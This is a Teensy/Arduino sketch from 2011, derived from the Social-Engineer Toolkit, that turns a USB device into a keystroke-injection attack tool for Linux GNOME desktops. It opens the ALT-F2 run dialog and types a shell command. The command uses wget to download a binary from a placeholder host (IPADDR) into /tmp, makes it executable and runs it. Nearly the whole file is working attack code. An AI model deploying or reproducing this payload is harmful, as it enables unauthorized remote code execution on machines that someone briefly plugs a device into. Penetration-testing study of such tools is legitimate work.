/** gnome_wget.ino
 * 
 * Author: Hugo Caron (y0ug)
 * Date: 2011/03/19
 *  
 *
 * Teensy pde for linux with Gnome desktop and wget
 *  - Open "run an application" window (ALT-F2)
 *  - Type a cmd who download a file with wget in tmp folder and run
 *
 * Note: I only test on my laptop under ubuntu 10.10
 *
 * Based on code of Social-Engineer Toolkit, Teensy Attack Vector
 * Thanks to Dave Kennedy (ReL1K) for pde example
 * 
 * ReL1K: Added x.exe extension even though they are elf binaries, won't make a difference
 * just easier to note recode and leave it the same.
 * 
 */

#define PAYLOAD "/bin/sh -c \"\
	wget -O /tmp/x http://IPADDR/x.exe &&\
	chmod +x /tmp/x && \
	/tmp/x \
	\""

void setup() { 
    delay(5000);
    exec_gnome(PAYLOAD);
}

void loop() {
	delay(1000000);
}

void exec_gnome(char *SomeCommand){
  // Press ALT-F2 ( Gnome - "run an application" window )
  Keyboard.set_modifier(MODIFIERKEY_ALT); 
  Keyboard.set_key1(KEY_F2);
  Keyboard.send_now();

  // Set blank key
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0); 
  Keyboard.send_now(); 

  delay(1500);
  
  // Send the command
  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  // Reset key
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
